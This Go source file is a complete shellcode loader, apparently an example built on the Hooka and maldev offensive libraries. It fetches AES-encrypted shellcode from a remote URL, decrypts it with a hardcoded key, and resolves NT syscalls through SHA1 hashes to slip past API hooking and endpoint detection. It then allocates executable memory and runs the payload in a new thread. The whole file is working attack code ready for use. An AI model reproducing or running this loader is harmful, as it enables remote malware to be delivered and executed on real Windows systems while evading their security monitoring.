package main

import (
	"crypto/sha1"
	"encoding/hex"
	"fmt"
	"golang.org/x/sys/windows"
	"log"
	"os"
	"syscall"
	"unsafe"

	"github.com/D3Ext/Hooka/pkg/hooka"
	mcrypto "github.com/D3Ext/maldev/crypto"
	mshellcode "github.com/D3Ext/maldev/shellcode"
)

func Sha1(str string) string {
	hash := sha1.Sum([]byte(str))
	return hex.EncodeToString(hash[:])
}

func main() {

	fmt.Println("[*] Retrieving encrypted shellcode...")
	// remote shellcode is encrypted with AES
	enc_shellcode, err := mshellcode.GetShellcodeFromUrl(os.Args[1])
	if err != nil {
		log.Fatal(err)
	}

	iv := enc_shellcode[0:16]
	enc_shellcode = enc_shellcode[16:]
	password := "MySuperSecret32BitsLongPassword!"

	fmt.Println("[*] Decrypting shellcode...")
	shellcode, err := mcrypto.AESDecrypt(enc_shellcode, iv, []byte(password))
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("[*] Resolving API calls...")
	// 04262a7943514ab931287729e862ca663d81f515 --> StrToSha1("NtAllocateVirtualMemory")
	NtAllocateVirtualMemory, _, err := hooka.GetSysIdHashing("04262a7943514ab931287729e862ca663d81f515", Sha1)
	if err != nil {
		log.Fatal(err)
	}

	// 6caed95840c323932b680d07df0a1bce28a89d1c --> StrToSha1("NtWriteVirtualMemory")
	NtWriteVirtualMemory, _, err := hooka.GetSysIdHashing("6caed95840c323932b680d07df0a1bce28a89d1c", Sha1)
	if err != nil {
		log.Fatal(err)
	}

	// 059637f5757d91ad1bc91215f73ab6037db6fe59 --> StrToSha1("NtProtectVirtualMemory")
	NtProtectVirtualMemory, _, err := hooka.GetSysIdHashing("059637f5757d91ad1bc91215f73ab6037db6fe59", Sha1)
	if err != nil {
		log.Fatal(err)
	}

	// 91958a615f982790029f18c9cdb6d7f7e02d396f --> StrToSha1("NtCreateThreadEx")
	NtCreateThreadEx, _, err := hooka.GetSysIdHashing("91958a615f982790029f18c9cdb6d7f7e02d396f", Sha1)
	if err != nil {
		log.Fatal(err)
	}

	var addr uintptr
	regionsize := uintptr(len(shellcode))

	fmt.Println("[*] Calling NtAllocateVirtualMemory...")
	r, err := hooka.Syscall(
		NtAllocateVirtualMemory,
		uintptr(0xffffffffffffffff),
		uintptr(unsafe.Pointer(&addr)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		syscall.PAGE_READWRITE,
	)
	if r != 0 {
		log.Fatal(err)
	}

	fmt.Println("[*] Calling NtWriteVirtualMemory...")
	hooka.Syscall(
		NtWriteVirtualMemory,
		uintptr(0xffffffffffffffff),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		0,
	)

	fmt.Println("[*] Calling NtProtectVirtualMemory...")
	var oldProtect uintptr
	r, err = hooka.Syscall(
		NtProtectVirtualMemory,
		uintptr(0xffffffffffffffff),
		uintptr(unsafe.Pointer(&addr)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if r != 0 {
		log.Fatal(err)
	}

	fmt.Println("[*] Calling NtCreateThreadEx...")
	var hhosthread uintptr
	r, err = hooka.Syscall(
		NtCreateThreadEx,
		uintptr(unsafe.Pointer(&hhosthread)),
		0x1FFFFF,
		0,
		uintptr(0xffffffffffffffff),
		addr,
		0,
		uintptr(0),
		0,
		0,
		0,
		0,
	)

	fmt.Println("[*] Executing shellcode...")
	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)

	if r != 0 {
		log.Fatal(err)
	}

	fmt.Println("[+] Shellcode has been executed!")
}
